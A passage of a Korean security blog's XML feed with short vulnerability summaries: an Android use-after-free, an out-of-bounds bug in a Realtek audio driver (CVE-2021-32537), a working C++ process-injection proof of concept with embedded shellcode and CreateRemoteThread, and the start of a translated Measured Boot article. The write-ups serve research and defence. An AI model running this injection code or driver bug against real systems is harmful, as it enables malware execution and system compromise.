&#xB9E4;&#xD551;&#xC5D0; &#xB300;&#xD574; &#xACBD;&#xC7C1;&#xD558;&#xB3C4;&#xB85D; race condition&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xAD6C;&#xC870;&#xCCB4; <code>kpsl_mem_entry</code>&#xAC00; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xB450; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xB3D9;&#xC2DC;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xC5B4; use-after-free&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>uaf</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>race-condition</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-32537: Realtek 드라이버의 OOB Access 취약점</title>
    <link href="/2021/06/29/l0ch/2021-06-29/"/>
    <url>/2021/06/29/l0ch/2021-06-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0vercl0k/CVE-2021-32537">CVE-2021-32537: Out-of-bounds access in RTKVHD64 leading to pool corruption.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Surface Book/Pro</li><li>Lenovo Thinkpad</li><li>Dell XPS 13</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Realtek&#xC758; &#xC624;&#xB514;&#xC624; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; OOB Access &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4; &#xBC0F; PoC&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC624;&#xB514;&#xC624; &#xB4DC;&#xB77C;&#xC774;&#xBC84; <code>RTKVHD64.sys</code>&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xCD08;&#xAE30;&#xD654; &#xC911; <code>PcAddAdapterDevice</code> &#xD568;&#xC218;&#xC758; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC778; <code>StartDevice</code>&#xC5D0; &#xC758;&#xD574; &#xD638;&#xCD9C;&#xB41C; <code>InitDeviceExtension</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xCEE4;&#xB110; &#xD480;&#xC5D0; <code>MEVT</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">devext-&gt;unk-&gt;events = ExAllocatePoolWithTag(pooltype, 0x5F0ui64, &apos;mEvt&apos;);<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EVT</span> {</span>    PKSPIN_LOCK lock;    PVOID       event;    UINT64      someflag;} <span class="hljs-comment">/* sizeof == 0x18 */</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MEVT</span> {</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EVT</span> <span class="hljs-title">array</span>[63];</span>    UINT64 flags;} <span class="hljs-comment">/* sizeof == 0x18*63 + 8 == 0x5f0 */</span></code></pre><p><code>MEVT</code>&#xC758; <code>EVT</code> &#xAD6C;&#xC870;&#xCCB4;&#xB294; 63&#xAC1C;&#xC758; &#xACE0;&#xC815;&#xB41C; &#xD06C;&#xAE30;&#xC758; &#xBC30;&#xC5F4;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">input_index = *(_DWORD *)IrpSystemBuffer;v5 = Crash(mevts, <span class="hljs-built_in">stack</span>-&gt;FileObject, unk, &amp;mevts-&gt;<span class="hljs-built_in">array</span>[input_index].event,        (KSPIN_LOCK *)&amp;mevts-&gt;<span class="hljs-built_in">array</span>[input_index]);</code></pre><p>&#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; <code>0x225f04</code> IOCTL &#xCF54;&#xB4DC;&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xBA74; &#xC720;&#xC800;&#xBC84;&#xD37C;&#xC778; <code>IrpSystemBuffer</code>&#xC758; &#xCCAB; &#xBC88;&#xC9F8; DWORD &#xB370;&#xC774;&#xD130;&#xAC00; <code>input_index</code>&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. <code>input_index</code>&#xB294; &#xC704; <code>Crash</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>(KSPIN_LOCK *)&amp;mevts-&gt;array[input_index]</code>&#xC640; &#xAC19;&#xC774; <code>MEVT</code>&#xC758; <code>EVT</code> &#xBC30;&#xC5F4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xB54C; &#xC778;&#xB371;&#xC2A4;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD574;&#xCEE4;&#xB294; IOCTL &#xC785;&#xB825; &#xBC84;&#xD37C;&#xB97C; &#xD1B5;&#xD574; <code>input_index</code>&#xB97C; &#xC784;&#xC758;&#xC758; &#xAC12;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC5B4; Out Of Bound Access&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>oob</tag>
      
      <tag>kernel</tag>
      
      <tag>windows</tag>
      
      <tag>driver</tag>
      
      <tag>L0ch</tag>
      
      <tag>realtek</tag>
      
      <tag>out-of-bound</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Process Injection without Write/Execute Permission</title>
    <link href="/2021/06/28/idioth/2021-06-28/"/>
    <url>/2021/06/28/idioth/2021-06-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://xret2pwn.github.io//process-inection/">Process Injection without Write/Execute Permission</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD574;&#xB2F9; &#xBE14;&#xB85C;&#xADF8;&#xC5D0;&#xC11C; non-writable allocation&#xC5D0; shellcode&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0; non-executable allocation&#xC5D0;&#xC11C; &#xC774;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; non-writable allocation&#xC5D0; <code>VirtualAlloc</code>&#xC744; &#xD1B5;&#xD574; <code>PAGE_EXECUTE_READ</code> &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD558;&#xC5EC; shellcode&#xB97C; &#xC791;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READ);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Allocation created successfully %p \n&quot;</span>, exec);<span class="hljs-keyword">if</span> (WriteProcessMemory(GetCurrentProcess(), exec, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>)) {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Shellcode wrote successfully.&quot;</span>);}<span class="hljs-keyword">else</span> {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] No permission to write the shellcode.&quot;</span>);}</code></pre><p><img src="https://xret2pwn.github.io/assets/img/posts/Process_Injection/cpp_write_the_shellcode_executed.png" alt="screenshot_4"></p><p>&#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; shellcode&#xAC00; &#xC791;&#xC131;&#xB428;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; &#xD574;&#xB2F9; &#xC601;&#xC5ED; (non-executable allocation)&#xC5D0; <code>PAGE_READONLY</code> &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; DEP (Data Execution Prevention) &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xC9C1;&#xC811; shellcode&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; DEP&#xAC00; &#xAC78;&#xB824;&#xC788;&#xC9C0; &#xC54A;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xCC3E;&#xC544; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; shellcode&#xB97C; injection &#xD558;&#xBA74; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xAD8C;&#xD55C; &#xC5C6;&#xC774; shellcode&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>POC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] =        <span class="hljs-string">&quot;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b&quot;</span>        <span class="hljs-string">&quot;\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b&quot;</span>        <span class="hljs-string">&quot;\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24&quot;</span>        <span class="hljs-string">&quot;\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a&quot;</span>        <span class="hljs-string">&quot;\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0&quot;</span>        <span class="hljs-string">&quot;\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c&quot;</span>        <span class="hljs-string">&quot;\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a&quot;</span>        <span class="hljs-string">&quot;\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2&quot;</span>        <span class="hljs-string">&quot;\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f&quot;</span>        <span class="hljs-string">&quot;\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52&quot;</span>        <span class="hljs-string">&quot;\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33&quot;</span>        <span class="hljs-string">&quot;\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89&quot;</span>        <span class="hljs-string">&quot;\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c&quot;</span>        <span class="hljs-string">&quot;\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67&quot;</span>        <span class="hljs-string">&quot;\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3&quot;</span>        <span class="hljs-string">&quot;\x68\x70\x77\x6e\x58\x68\x52\x65\x74\x32\x31\xc9\x88\x4c\x24&quot;</span>        <span class="hljs-string">&quot;\x07\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff&quot;</span>        <span class="hljs-string">&quot;\x55\x08&quot;</span>;    HANDLE processHandle;    HANDLE remoteThread;    PVOID remoteBuffer;    DWORD oldPerms;    DWORD PID = <span class="hljs-number">17968</span>;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Injecting to PID: %i&quot;</span>, PID);    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);    remoteBuffer = VirtualAllocEx(processHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span> shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);    WriteProcessMemory(processHandle, remoteBuffer, shellcode, <span class="hljs-keyword">sizeof</span> shellcode, <span class="hljs-literal">NULL</span>);    VirtualProtectEx(processHandle, (LPVOID)<span class="hljs-keyword">sizeof</span>(processHandle), <span class="hljs-keyword">sizeof</span>(shellcode), PAGE_READONLY, &amp;oldPerms);    remoteThread = CreateRemoteThread(processHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);    CloseHandle(processHandle);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>process injection</tag>
      
      <tag>cpp</tag>
      
      <tag>shellcode</tag>
      
      <tag>redteam</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Measured Boot와 멀웨어 시그니처: Windows Loader에서 발견된 두 가지 취약점</title>
    <link href="/2021/06/27/l0ch/measured-boot-vuln/"/>
    <url>/2021/06/27/l0ch/measured-boot-vuln/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; L0ch&#xC785;&#xB2C8;&#xB2E4;!</p><p>&#xC624;&#xB298;&#xC740; Windows Kernel &#xBC0F; Loader&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810; &#xB450; &#xAC1C;&#xB97C; &#xB4E4;&#xACE0; &#xC654;&#xB294;&#xB370;&#xC694;, &#xC6D0;&#xB798;&#xB294; &#xD558;&#xB8E8;&#xD55C;&#xC904;&#xB85C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC815;&#xB9AC;&#xD558;&#xB824;&#xB2E4; &#xC811;&#xD560; &#xAE30;&#xD68C;&#xAC00; &#xB9CE;&#xC774; &#xC5C6;&#xB294; Boot Security&#xC5D0; &#xB300;&#xD55C; &#xC124;&#xBA85; &#xB4F1; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC774;&#xD574;&#xB97C; &#xB3D5;&#xAE30; &#xC704;&#xD55C; &#xB0B4;&#xC6A9;&#xC774; &#xC798; &#xC815;&#xB9AC;&#xB418;&#xC5B4; &#xC788;&#xB354;&#xB77C;&#xAD6C;&#xC694;. &#xAC1C;&#xC778;&#xC801;&#xC73C;&#xB85C; &#xC7AC;&#xBC0C;&#xAC8C; &#xC77D;&#xC5B4;&#xC11C; &#xC815;&#xB9AC;&#xB3C4; &#xD560; &#xACB8; &#xBC88;&#xC5ED;&#xAE00;&#xB85C; &#xB0A8;&#xACA8;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC624;&#xC5ED;&#xACFC; &#xC758;&#xC5ED;&#xB369;&#xC5B4;&#xB9AC; &#xBC88;&#xC5ED;&#xAE00;&#xC774;&#xB2C8; &#xC9C0;&#xC801;&#xC740; &#xB9E4;&#xC6B0; &#xD658;&#xC601;&#xC774;&#xC5D0;&#xC694;..!</p><blockquote><p>&#xC6D0;&#xBB38; : <a href="https://bi-zone.medium.com/measured-boot-and-malware-signatures-exploring-two-vulnerabilities-found-in-the-windows-loader-5a4fcc3c4b66">Measured Boot and Malware Signatures: exploring two vulnerabilities found in the Windows loader</a></p></blockquote><hr><h1 id="Introduction-to-Boot-Security"><a href="#Introduction-to-Boot-Security" class="headerlink" title="Introduction to Boot Security"></a>Introduction to Boot Security</h1><p>Boot Security&#xC5D0;&#xB294; Verified Boot&#xC640; Measured Boot&#xB77C;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xC8FC;&#xC694; &#xAC1C;&#xB150;&#xC774; &#xC788;&#xB2E4;.</p><h2 id="Verified-Boot"><a href="#Verified-Boot" class="headerlink" title="Verified Boot"></a>Verified Boot</h2><p>Verified Boot &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xB294; &#xB514;&#xC9C0;&#xD138; &#xC11C;&#xBA85;&#xC774; &#xB418;&#xC9C0; &#xC54A;&#xC740; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xAC00; &#xBD80;&#xD305; &#xC911;&#xC5D0; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xD55C;&#xB2E4;. &#xC774; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xC11C;&#xBA85;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xAC70;&#xB098; &#xC81C;&#xB300;&#xB85C; &#xC11C;&#xBA85;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBD80;&#xD305; &#xAD6C;&#xC131; &#xC694;&#xC18C; (&#xC608; : &#xBD80;&#xD305; &#xAD00;&#xB9AC;&#xC790; &#xBC0F; &#xD38C;&#xC6E8;&#xC5B4; &#xB4DC;&#xB77C;&#xC774;&#xBC84;)&#xAC00; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xAC83;&#xC744; &#xCC28;&#xB2E8;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC778; Secure Boot&#xB85C; &#xAD6C;&#xD604;&#xB41C;&#xB2E4;.</p><h2 id="Measured-Boot"><a href="#Measured-Boot" class="headerlink" title="Measured Boot"></a>Measured Boot</h2><p>Measured Boot &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xBD80;&#xD305; &#xC911; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC804; &#xBAA8;&#xB4E0; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xB97C; &#xAE30;&#xB85D;&#xD55C;&#xB2E4;. &#xC774;&#xB294; &#xBCC0;&#xC870; &#xBC29;&#xC9C0; &#xBC29;&#xC2DD;(tamper-proof way)&#xC73C;&#xB85C; &#xC720;&#xC9C0;&#xB418;&#xBA70; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xB294; &#xD50C;&#xB7AB;&#xD3FC; &#xBAA8;&#xB4C8; (Trusted Platform Module, TPM)&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAD6C;&#xD604;&#xB41C;&#xB2E4;. TPM&#xC740; &#xD38C;&#xC6E8;&#xC5B4; &#xBC0F; &#xC911;&#xC694; &#xC6B4;&#xC601; &#xCCB4;&#xC81C; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC758; &#xD574;&#xC2DC;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xC5B4; &#xC545;&#xC131; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xD574;&#xC2DC;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBC29;&#xC9C0;&#xD55C;&#xB2E4;. </p><p>Verified Boot&#xC640; Measured Boot&#xB294; &#xB3D9;&#xC2DC;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xAC1C;&#xB150;&#xACFC; Windows&#xC5D0;&#xC11C;&#xC758; &#xAD6C;&#xD604;&#xC5D0; &#xB300;&#xD55C; &#xAE30;&#xC220;&#xC801; &#xC138;&#xBD80; &#xC0AC;&#xD56D;&#xC740; <a href="https://edk2-docs.gitbook.io/understanding-the-uefi-secure-boot-chain/overview">Reference [1]</a>&#xACFC; <a href="https://docs.microsoft.com/en-us/windows/security/information-protection/secure-the-windows-10-boot-process">Reference [2]</a>&#xC5D0;&#xC11C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xC704; &#xB450; &#xAC00;&#xC9C0; &#xC774;&#xC678;&#xC5D0;&#xB3C4; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xB124; &#xAC00;&#xC9C0;&#xC758; &#xAC1C;&#xB150;&#xC774; &#xC788;&#xB2E4;.</p><ul><li>Post-boot verification - &#xBD80;&#xD305; &#xC774;&#xD6C4; &#xD655;&#xC778;</li><li>Booting from read-only media - &#xC77D;&#xAE30; &#xC804;&#xC6A9; &#xBBF8;&#xB514;&#xC5B4;&#xC5D0;&#xC11C; &#xBD80;&#xD305;</li><li>Booting from a read-only volume(image) - &#xC77D;&#xAE30; &#xC804;&#xC6A9; &#xBCFC;&#xB968;(&#xC774;&#xBBF8;&#xC9C0;)&#xC5D0;&#xC11C; &#xBD80;&#xD305;</li><li>pre-boot verification - &#xBD80;&#xD305; &#xC804; &#xD655;&#xC778;</li></ul><h2 id="Post-boot-verification"><a href="#Post-boot-verification" class="headerlink" title="Post-boot verification"></a>Post-boot verification</h2><p>Post-boot verification&#xC740; &#xBD80;&#xD305; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC644;&#xB8CC;&#xB41C; &#xC774;&#xD6C4; &#xB610;&#xB294; &#xD6C4;&#xBC18; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xB41C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xC758;&#xD574; &#xC218;&#xD589;&#xB41C;&#xB2E4;. &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC774;&#xC804;&#xC5D0; &#xC2E4;&#xD589;&#xB41C; OS &#xAD6C;&#xC131;&#xC694;&#xC18C;&#xC640; &#xB370;&#xC774;&#xD130;&#xC758; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xD655;&#xC778;&#xD55C;&#xB2E4;. &#xC774; &#xBC29;&#xC2DD;&#xC740; &#xB354; &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xBA40;&#xC6E8;&#xC5B4;&#xC758; &#xACBD;&#xC6B0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD30C;&#xC77C; &#xC77D;&#xAE30; &#xC694;&#xCCAD;&#xC744; &#xAC00;&#xB85C;&#xCC44;&#xACE0; &#xBC18;&#xD658;&#xB418;&#xB294; &#xD30C;&#xC77C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC81C;&#xC5B4;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xB098; &#xADF8;&#xB7FC;&#xC5D0;&#xB3C4; &#xC548;&#xD2F0; &#xBA40;&#xC6E8;&#xC5B4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;, &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8; &#xD0D0;&#xC9C0; &#xBC0F; &#xB300;&#xC751; &#xC194;&#xB8E8;&#xC158;&#xACFC; &#xC554;&#xD638;&#xD654; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC758; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158;&#xC73C;&#xB85C;&#xC368; &#xC0AC;&#xC6A9;&#xD560; &#xAC00;&#xCE58;&#xAC00; &#xC788;&#xB2E4;.</p><h2 id="Booting-from-read-only-media"><a href="#Booting-from-read-only-media" class="headerlink" title="Booting from read-only media"></a>Booting from read-only media</h2><p>&#xC77D;&#xAE30; &#xC804;&#xC6A9; &#xBBF8;&#xB514;&#xC5B4;&#xC5D0;&#xC11C; &#xBD80;&#xD305;&#xD558;&#xB294; &#xAC83;&#xC740; BIOS &#xBC0F; UEFI&#xC640; &#xAC19;&#xC740; OS &#xC2DC;&#xC791; &#xC804; &#xD658;&#xACBD;(pre-OS environment)&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xAC1C;&#xB150;&#xC774; &#xC801;&#xC6A9;&#xB41C; &#xC628;&#xB77C;&#xC778; &#xBC45;&#xD0B9;&#xC744; &#xC704;&#xD55C; &#xC2E4;&#xC2DC;&#xAC04; &#xBC30;&#xD3EC; &#xBC29;&#xC2DD;&#xC740; &#xC774;&#xBBF8; &#xC218;&#xB144; &#xC804;&#xC5D0; <a href="http://thinkinghard.com/secureinternetbanking/index.html">&#xC81C;&#xC548;&#xB418;&#xC5C8;&#xC73C;&#xBA70;</a> &#xD604;&#xC7AC;&#xB294; &#xC7AC;&#xD0DD;&#xADFC;&#xBB34; &#xC2DC; &#xBCF4;&#xC548;&#xC744; &#xC704;&#xD574; &#xC81C;&#xC548;&#xB418;&#xAE30;&#xB3C4; &#xD55C;&#xB2E4;. &#xC774;&#xB294; &#xAE30;&#xC874;&#xC758; &#xC804;&#xD1B5;&#xC801;&#xC778; &#xBA40;&#xC6E8;&#xC5B4;&#xC5D0; &#xC644;&#xBCBD;&#xD558;&#xAC8C; &#xB300;&#xC751;&#xD574; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xBA40;&#xC6E8;&#xC5B4;&#xB85C;&#xBD80;&#xD130; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xBCF4;&#xD638;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xC545;&#xC131; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; OS &#xC774;&#xC804; &#xD658;&#xACBD;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA74; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;. &#xC774;&#xB3D9;&#xC2DD; &#xBBF8;&#xB514;&#xC5B4;&#xC5D0;&#xC11C; &#xBD80;&#xD305;&#xB418;&#xB294; OS&#xB97C; &#xC18D;&#xC5EC; &#xAE30;&#xC874; &#xBBF8;&#xB514;&#xC5B4;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB294; BIOS &#xB610;&#xB294; UEFI&#xAC00; &#xBD80;&#xD305; &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC744; &#xB54C; &#xAE30;&#xBCF8; &#xC2A4;&#xD1A0;&#xB9AC;&#xC9C0; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB85C; &#xC804;&#xD658;&#xD558;&#xB294; &#xB3D9;&#xC548; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xAD00;&#xB828;&#xB41C; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xC774;&#xC288;&#xC5D0; &#xB300;&#xD55C; &#xC790;&#xC138;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; <a href="https://dfir.ru/2018/07/21/a-live-forensic-distribution-executing-malicious-code-from-a-suspect-drive/">&#xC774;&#xC804; &#xAE00;&#xC5D0;&#xC11C;</a> &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h2 id="Booting-from-a-read-only-volume"><a href="#Booting-from-a-read-only-volume" class="headerlink" title="Booting from a read-only volume"></a>Booting from a read-only volume</h2><p>&#xC77D;&#xAE30; &#xC804;&#xC6A9; 